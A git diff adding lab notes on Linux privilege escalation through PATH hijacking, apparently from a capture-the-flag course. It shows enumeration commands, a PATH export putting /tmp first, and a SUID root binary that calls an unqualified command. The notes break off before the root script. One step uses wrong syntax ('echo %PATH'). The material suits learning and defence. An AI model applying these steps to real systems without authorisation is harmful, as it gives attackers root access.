@@ -621,5 +621,91 @@ root
 /root$
 ```
 ## Privilege Escalation: PATH
+* Can potentially hijack an application to run a script if a folder that the current user has write access to is located in the PATH.
+* PATH is an environmental variable that tells the OS where to look for executables.
+* Linux will search in folders defined in PATH for any command not built into the shell or not defined with an absolute path.
+1. What folders are located under $PATH?
+```
+echo %PATH
+```
+3. Does the current user have write privileges for any of these folders?
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+```
+* Refine `find` to get rid of the many results related to running processes.
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+4. Can the current user modify $PATH?
+   * Add `/tmp` folder to PATH.
+```
+export PATH=/tmp:$PATH
+```
+6. Is there a script or app that can be executed that will be affected by this vulnerability?
+### Challenge
+1. What folders are located under $PATH?
+```
+echo %PATH
+```
+```
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+3. Does the current user have write privileges for any of these folders?
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2 | grep -v proc | sort -u
+dev
+etc
+home
+run
+snap
+sys
+tmp
+usr
+var
+```
+* Refine `find` to identify subfolders under `home`.
+```
+karen@ip-10-10-66-41:/home/murdoch$ find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | grep -v proc | sort -u
+home/murdoch
+```
+4. Can the current user modify $PATH?
+6. Is there a script or app that can be executed that will be affected by this vulnerability?* 
+* User karen has write access to `/home/murdoch/` folder.
+  * Executables have the SUID bit set.
+```
+ls -la /home/murdoch
+total 32
+drwxrwxrwx 2 root root  4096 Oct 22  2021 .
+drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
+-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
+-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
+```
+```
+cat /home/murdoch/thm.py
+/usr/bin/python3
+
+import os
+import sys
+
+try: 
+	os.system("thm")
+except:
+	sys.exit()
+```
+* "test" file appears to be a compiled version of `thm.py' script.
+```
+./test
+sh: 1: thm: not found
+```
+* No path defined for this script.
+* Machine will look in the PATH environment to find the executable and will execute the first one it finds.
+* Add the `/tmp` directory into the beginning of the PATH environment.
+```
+export PATH=/tmp:$PATH
+```
+* Create script in `/tmp` folder that changes the user to root and executes the "test" file.
+ 
+* should elevate our privileges
+* 
 ## Privilege Escalation: NFS
 ## Capstone Challenge
